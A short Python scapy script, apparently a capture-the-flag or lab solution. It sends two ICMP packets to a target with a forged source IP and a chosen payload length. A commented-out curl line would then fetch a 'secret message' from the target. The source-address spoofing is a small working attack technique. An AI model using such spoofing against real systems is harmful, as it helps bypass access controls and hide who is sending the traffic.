import sys
from scapy.all import *
#import subprocess

if __name__ == "__main__":
        # store provided arguments in variables.
        ip_target = str(sys.argv[1])
        ip_spoof = str(sys.argv[2])
        packet_length = int(sys.argv[3])

        # Create payload of provided length and send packets twice
        payload = bytearray(packet_length)
        send(IP(dst=ip_target, src=ip_spoof) / ICMP() / payload, count=2)

        # Retrieve secret message.
        #subprocess.call(['curl', ip_target])

